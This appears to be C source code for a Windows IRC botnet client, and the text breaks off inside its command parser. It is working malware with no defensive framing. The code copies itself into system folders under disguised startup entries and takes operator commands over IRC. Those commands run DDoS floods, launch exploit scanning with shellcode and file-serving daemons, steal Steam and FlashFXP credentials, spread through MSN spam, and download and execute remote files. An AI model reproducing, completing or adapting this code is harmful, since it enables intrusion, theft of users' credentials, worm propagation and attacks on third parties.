#include "includes.h"
#include "extern.h"
#include "config.h"
#include "nnbot.h"
#include "ThemidaSDK.h"

char exploitn[15];
#define WIN32_LEAN_AND_MEAN



// program starts here
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	WSADATA wsadata;
	int i = 0, err = 0;
	int copies = 0;
	int current_server=0;
	service();
	usShellcodePort					= 30685;
	pShellcodeHandler.usPort		= usShellcodePort;	
	CreateMutex(NULL, FALSE, botid);
	while (GetLastError() == ERROR_ALREADY_EXISTS) {
		Sleep(6000);
	}
	
	err = WSAStartup(MAKEWORD(2, 2), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 2 || HIBYTE( wsadata.wVersion ) != 2 ) {
		WSACleanup();
		return 0;
	}

    char system[MAX_PATH];
    char windows[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    HKEY hKey;
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system,sizeof(system));
    GetWindowsDirectory(windows,sizeof(windows));
    strcat(system,"\\SySExpress.exe");
    strcat(windows,"\\SySExpress.exe");
    CopyFile(pathtofile,system,false);
    CopyFile(pathtofile,windows,false);
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
    RegSetValueEx(hKey, "Windows Live Messenger",0,REG_SZ,(const unsigned char*)system,sizeof(system));
    RegCloseKey(hKey);
	registry_AddCommonStartup(".NET FRAMEWORK 2.0", system);
	registry_AddCommonStartup("Directx9.0", windows);
	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));
	addthread("Bot started.",MAIN_THREAD,NULL);
	memset(log, 0, sizeof(log));
	strncpy(mainirc.host, servers[0], sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	irc_connect((void *)&mainirc);

	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();
	return 0;
	
}



// function to add an alias and return alias number
int addalias(char *name, char *command)
{
	int i;
	for (i = 0; i < maxaliases; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
}

// connect function used by the original bot and all clones/spies
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;
	DWORD err;
	int rval;
	char nick[16];
	char *nick1;
	
	char str[64];
	//	BYTE spy;
	ircs irc;
	
	irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;
	
	
	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);
		
		ssin.sin_addr.s_addr=ResolveAddress(irc.host);
		if (ssin.sin_addr.s_addr==0) return 0;
		
		HANDLE hFile, FileHandle;
		hFile = CreateFile("new.txt",
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			
			memset(nick, 0, sizeof(nick));
			nick1 = irc.nick; 
			nick1 = rndnick2(nick);
			
			
			FileHandle = CreateFile("new.txt", GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			if(FileHandle != INVALID_HANDLE_VALUE)
				CloseHandle(FileHandle);
			CloseHandle(hFile);
		}  
		memset(nick, 0, sizeof(nick));
		nick1 = irc.nick; 
		nick1 = rndnick(nick);
		
		
		
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}
		
		sprintf(str, "Connected to %s", irc.host);
		
		//addlog(str);
		
		strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);
		
		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.host);
		closesocket(sock);
		
		if (rval == 0) continue;
		if (rval == 1) {	//Disconnect (sleep 30 mins, reconnect..)
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;	//Quit
	}
	
	clearthread(irc.threadnum);
	cnick[irc.threadnum][0] = '\0';
	return rval;
}


char * rndnick2(char *strbuf)
{
	if (constnick){
		int i;
		
		srand(GetTickCount());
		sprintf(strbuf, "%s", nickconst);
		for (i=1; i<=maxrand; i++) sprintf(strbuf, "%s%i", strbuf, rand()%10);
		return strbuf;
	}
	int i;
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);
	
	srand(GetTickCount());
	
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else if (verinfo.dwMajorVersion == 6 && verinfo.dwMinorVersion == 0) os = "Vista";
	else os = "???";
	
	_snprintf(strbuf,maxrand,"|NEW|%s|",os);
	
	for (i=1;i < maxrand;i++) 
		_snprintf(strbuf, maxrand, "%s%i", strbuf, rand()%10);
	return (strbuf);
}

char * rndnick(char *strbuf)
{
	if (constnick){
		int i;
		
		srand(GetTickCount());
		sprintf(strbuf, "%s", nickconst);
		for (i=1; i<=maxrand; i++) sprintf(strbuf, "%s%i", strbuf, rand()%10);
		return strbuf;
	}
	int i;
	char *os="";
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);
	
	srand(GetTickCount());
	
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2K3";
	else if (verinfo.dwMajorVersion == 6 && verinfo.dwMinorVersion == 0) os = "Vista";
	else os = "???";
	
	_snprintf(strbuf,maxrand,"%s|",os);
	
	for (i=1;i < maxrand;i++) 
		_snprintf(strbuf, maxrand, "%s%i", strbuf, rand()%10);
	return (strbuf);
}

// receive loop for bots/spies
// int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, BYTE spy)
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, char *server)
{
	// main receive buffer
	char buff[4096];
	int err, repeat;
	char master[128*maxlogins];
	char str[8];
	char login[64];
	int in_channel=0;
	
	memset(master, 0, sizeof(master));
	
	
	if (serverpass[0] != '\0') {
		sprintf(login, "PASS %s\r\n", serverpass);
		send(sock, login, strlen(login), 0);
	}
	
	//
	//Fixed the nick problem, lol i just used the original - Im just so l33t -  D3ADLiN3
	//
	sprintf(login, "NICK %s\r\n"
		"USER %s 0 0 :%s\r\n", nick1, rndnick(str), nick1);
	//
	//
	//
	err = send(sock, login, strlen(login), 0);
	if (err == SOCKET_ERROR) {
		closesocket(sock);
		Sleep(5000);
		return 0;
	}
	
	// loop forever
	while(1) {
		char host[160];
		char *lines[MAX_LINES];
		int i,j;
		
		
		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		// if recv() returns 0, that means that the connection has been lost.
		if ((err == 0) || (err == SOCKET_ERROR)) break;
		
		// split lines up if multiple lines received at once, and parse each line
		
		
		i=Split(buff,&lines);
		for (j=0;j<i;j++) {
			repeat=1;
			do {
				repeat=irc_parseline(lines[j], sock, channel, chanpass, nick1, server, master, host, &in_channel, repeat);
				repeat--;
			} while (repeat>0);
			if (repeat==-1) return 0;	//Reconnect
			else if (repeat==-2) return 1;	//Disconnect
			else if (repeat==-3) return 2;	//Quit
		}
		
	}
	
	return 0;
}

// function to parse lines for the bot and clones
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat)
{
	char line1[512];
	char line2[512];
	//	char buff[512];
	char *masters[maxlogins];
	bool param[256];
	BOOL ismaster;
	char ntmp[12];
	char ntmp2[3];
	int i, ii, s;
	char *a[32];
	char a0[128];
	char nick[16];
	char user[24];
	char sendbuf[512];
	unsigned char parmenters[256];
	//unsigned char parameters[256];
	char msg_real_dest[256];
	DWORD id;
	BOOL silent = FALSE;
	BOOL notice = FALSE;
	BOOL usevars = FALSE;
	int cl;
	
	memset(sendbuf, 0, sizeof(sendbuf));
	memset(param, 0, sizeof(param));
	id = 0;
	strncpy(nick, nick1, sizeof(nick)-1);
	for (i = 0; i < maxlogins; i++) masters[i] = master + (i * 128);
	
	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");
	
	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
	
	if (a[0] == NULL || a[1] == NULL) return 1;
	
	silent=FALSE;   //silent by default :) 
	//check for 'silent' parameter 
	
	memset(parmenters,0,sizeof(parmenters)); 
	
	for (i=31;i>=0;i--) { 
		if (!a[i]) continue; 
		if ((a[i][0]=='-') && (a[i][2]==0)) { 
			//Looks like a valid parmenter.. 
			parmenters[a[i][1]]=1; 
			a[i][0]=0; 
			a[i][1]=0; 
			a[i][2]=0; 
			a[i]=NULL; 
		} else break; 
	} 
	
	if (parmenters['s']) silent=TRUE; 
	if (parmenters['n']) { 
		silent=FALSE; 
		notice=TRUE; 
	}
	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}
	
	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';
		
		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		if (*in_channel == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}
	
	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		irc_sendf(sock, "USERHOST %s\r\n", nick1); // get our hostname
		irc_sendf(sock,"MODE %s +i\r\n",nick1);
		success = TRUE;
		return 1;
	}
	
	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) strncpy(host,  h+1, 159);
		return 1;
	}
	
	// nick already in use   - 
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1);
		irc_sendf(sock, "NICK %s\r\n", nick1);
		return 1;
	}
	
	
	// check if user is logged in
	ismaster = FALSE;
	for (i = 0; i < maxlogins; i++) {
		if (strcmp(masters[i], a0) == 0) {
			ismaster = TRUE;
		}
	}
	
	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < maxlogins; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) if (strcmp(knick, a[3]) == 0) {
				masters[i][0] = '\0';
				sprintf(sendbuf,"User %s logged out", knick);
				irc_sendf2(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				//	addlog(sendbuf);
			}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}
	
	
	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user;
		char *newnck = a[2] + 1;
		for (i=0;i<maxlogins;i++) {
			if (strcmp(masters[i],a0)==0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if (oldnck != NULL && newnck != NULL)  {
			if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		}
		return 1;
	}
	
	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (masters[i][0] != '\0') if (strcmp(masters[i], a[0]) == 0) {
		masters[i][0] = '\0';
		sprintf(sendbuf, "User %s logged out", user);
		//addlog(sendbuf);
		if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
		return 1;
	}
	
	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		sprintf(sendbuf, "Joined channel %s", a[4]);
		//addlog(sendbuf);
		return 1;
	}
	
	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			if (a[2] == NULL) return 1;
			strcpy(msg_real_dest,a[2]);
			if (strstr(a[2], "#") == NULL || notice) a[2] = user;
			
			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (strncmp(nick, a[3], strlen(nick)) == 0) s = 4; else s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], version);
				return 1;
			}
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				return 1;
			}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}
		
		if (a[s]++[0] != prefix1) return 1;
		// see if someone is logging in
		
		if (strcmp("login", a[s]) == 0) {
			if (a[s+1] == NULL || ismaster)
				return 1;
			if (ismaster || strstr(a[2], "#") == NULL) return 1;
			char *u = strtok(a[0], "!") + 1;
			char *h = strtok(NULL, "\0");
			if (strcmp(password, a[s+1]) != 0) {
				return 1;
			}
			BOOL host_ok=FALSE;
			for (int i=0; i < authsize; i++) {
				if (wildcardfit(authost[i], h)) {
					host_ok = TRUE;
					break;
				}
			}
			if (!host_ok) {
#ifdef _DEBUG
				printf("Debug// login hostauth failed.\n");
#endif
				return 1;
			}
			for(i = 0; i < maxlogins; i++)
			{
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "~~~ OK!", notice);
					break;
				}
			}
			return 1;
		}
		
		
		
		
		if (ismaster || strcmp("332", a[1]) == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix1;
					sc[3] = prefix1;
					strncpy(sc+4, aliases[i].command, 159);
					
					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}
					
					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					}
					
					usevars = TRUE;
					break;
				}
			}
			
			if (a[s][0] == prefix1 || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server
				
				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					ntmp2[1] = '\0';
					cl = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, cl+6);
					replacestr(line, ntmp, ntmp2);
				}
				
				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				if (a[s] == NULL) return 1;
				a[s] += 3;
			}
			
			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "User %s logged out\r\n", user);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					//addlog(sendbuf);
				}
			}
#ifndef NO_BOTVERSION
			else if (strcmp("version", a[s]) == 0 || strcmp("ver", a[s]) == 0) {
				sprintf(sendbuf, bversion);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
#endif
			/* - Ignore this, just some test code I was using.
			else if (strcmp("restrict", a[s]) == 0) {
			HKEY hKey;
			DWORD dwData;
			if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Contol\\Lsa", 0, KEY_ALL_ACCESS, &hKey) != 0) return 1;
			dwData = 0x00000001;
			RegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD));
			RegCloseKey(hKey);
			irc_privmsg(sock, a[2], "Restricted NULL access to the IPC$ Share.", notice);
			}
			#endif
			*/
			
			
			else if (strcmp("flashfxp", a[s]) == 0) { 
				if(FlashFXP(0)) irc_privmsg(sock, a[2], "Found FlashFXP History File", notice); 
				else if(!silent) irc_privmsg(sock, a[2], "No FlashFXP History File Found!", notice); 
			} 
			else if (strcmp("flashfxp.parse", a[s]) == 0) { 
				FlashFXP(1); 
				if(!silent) irc_privmsg(sock, a[2], "Parsing done", notice); 
			}
			
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				irc_send(sock, "QUIT :Reconnecting..");
				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				irc_send(sock, "QUIT :Client exiting");
				return -1;
			}
			else if (strcmp("skysyn", a[s]) == 0 || strcmp("ddos", a[s]) == 0) {
				SkySyn(a[s+1],a[s+2],a[s+3]);
				sprintf(sendbuf, "-DDOS- Module[%s] Attacking target: %s %s %s", notice,a[s],a[s+1],a[s+2],a[s+3]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice); 
				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				if (a[s+1] == NULL) irc_send(sock, "QUIT :Client exiting\r\n"); else {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));
				
				sprintf(sendbuf, "threads: list threads.");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"threads: failed to start list thread, error: <%d>.", GetLastError());
				//	addlog(sendbuf);
				
				return repeat;
			}

				else if (strcmp("autoscan", a[s]) == 0 || strcmp("ascan", a[s]) == 0){
				sprintf(sendbuf,"-Scanner- AutoScanner: [Starting]");
				usShellcodePort					= 30685;
				pShellcodeHandler.usPort		= usShellcodePort;	
				AddThread(ShellcodeServer,		&pShellcodeHandler, 1,	"ShellcodeDaemon");
				AddThread(TFTPDHandler,			NULL,				1,	"TFTPDaemon");
				AddThread(FtpdHandler,			NULL,				1,	"FTPDaemon");
				g_pScannerHandler.usPort		= pExploit[0].usPort;
				g_pScannerHandler.iExploitId	= 0;
				g_pScannerHandler.dwStartIp = inet_addr("24.10.10.10");
				g_pScannerHandler.iMinutes = 60;
				g_pScannerHandler.iScanType = 0;
				g_pScannerHandler.iThreads = 15;
				g_pScannerHandler.iThreads = ((g_pScannerHandler.iThreads < 0)?(128):(g_pScannerHandler.iThreads));
				g_pScannerHandler.iThreads = ((g_pScannerHandler.iThreads > 4098)?(4098):(g_pScannerHandler.iThreads));
				g_pScannerHandler.iDelay = 5;
				g_pScannerHandler.bLogicScan = true;
				AddThread(&ScanThread, (LPVOID)&g_pScannerHandler, 1, "Scanner");
				sprintf(sendbuf,"-Scanner- AutoScanner: [Initialized]");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp("remove", a[s]) == 0 || strcmp("rm", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "Removing bot..", notice);
				uninstall();
				WSACleanup();
				exit(0);
			}
			else if (strcmp("steam", a[s]) == 0 || strcmp("valve", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "[Gathering Steam Shit]", notice);
				GrabSteamClientModule(NULL);
				Cmd_slogininfo();
			}

	
			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			
			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendf(sock, "PART %s\r\n", a[s+1]);
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_send(sock, y);
				}
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"threads: Stopped: %d thread(s).", i);
					else
						sprintf(sendbuf,"threads: No active threads found.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					//addlog(sendbuf);					
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;
						
						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"threads: Killed thread: %s.",a[i]);
						else 
							sprintf(sendbuf,"threads: Failed to kill thread: %s.",a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						//addlog(sendbuf);
					}
				}
				
				return 1;
			}
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					if (!silent) irc_privmsg(sock, a[2], "File opened.", notice);
				} else {
					if (!silent) irc_privmsg(sock, a[2], "Couldn't open file.", notice);
				}
			}

			else if (strcmp("honeypot", a[s]) == 0 || strcmp("honey", a[s]) == 0) {
				AddThread(&IdentThread, (LPVOID)&IdentThread, 1, "IdentThread");
				AddThread(&MYDOOM2,     (LPVOID)&MYDOOM2,     1,     "MYDOOM2");
				AddThread(&MYDOOM,      (LPVOID)&MYDOOM,      1,      "MYDOOM");
				AddThread(&VNCHONEYPOT, (LPVOID)&VNCHONEYPOT, 1, "VNCHONEYPOT");

#ifndef __WORMRIDE_H__
#define __WORMRIDE_H__
				
				if(!GetSocketAddress(i, szFtpdIp))
					strncpy(szFtpdIp, "unknown", sizeof(szFtpdIp));
				
				sprintf(sendbuf,"-HoneyPot- IP:[%s] Modules: [Mydoom2] [Mydoom] [VNCHoneypot] [FakeIRCD] -{Loaded}-",ResolveHost(szFtpdIp), szFtpdIp,a[i]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
#endif // __WORMRIDE_H__
			}
		

			
				else if (strcmp("msn.start", a[s]) == 0 || strcmp("msn", a[s]) == 0) {
				char windir[MAX_PATH];
				char buf3[260]; 
				GetWindowsDirectory(windir,sizeof(windir));
				GetModuleFileName(NULL,buf3,MAX_PATH);
				strcat(windir,"\\");
				strcat(windir,a[s+1]);
				zip_store(buf3,windir,a[s+2]);
				msn_SpreadFile(windir,a[s+3]);
				sprintf(sendbuf,"-MSNWorm- Zip Location: %s / Filename: %s / Spam message: %s ",windir,a[s+2],a[s+3]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
				else if (strcmp("blowkey", a[s]) == 0 || strcmp("keyblow", a[s]) == 0) 
				{
#ifdef NO_BLOWFISH
					blowtest();
#endif
				}	
			else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
			}
			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
#ifndef NO_DOWNLOAD
			else if (strcmp("update", a[s]) == 0 || strcmp("up", a[s]) == 0) {
				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				char *filename[MAX_PATH];
				memset(filename,0,sizeof(filename));
				sprintf(ds.dest, "%s\\%s.exe", tempdir, nick);
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
				ds.update = 1;
				ds.silent = silent;
				threads[ds.threadnum].tHandle = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "downloading update from %s...\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
#endif
			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
#ifndef NO_DOWNLOAD
			else if (strcmp("download", a[s]) == 0 || strcmp("dl", a[s]) == 0) {
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				ds.update = 0;
				ds.silent = silent;
				threads[ds.threadnum].tHandle = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				if (!silent) sprintf(sendbuf, "downloading %s...\r\n", a[s+1]);
				irc_privmsg(sock, a[2], sendbuf, notice);
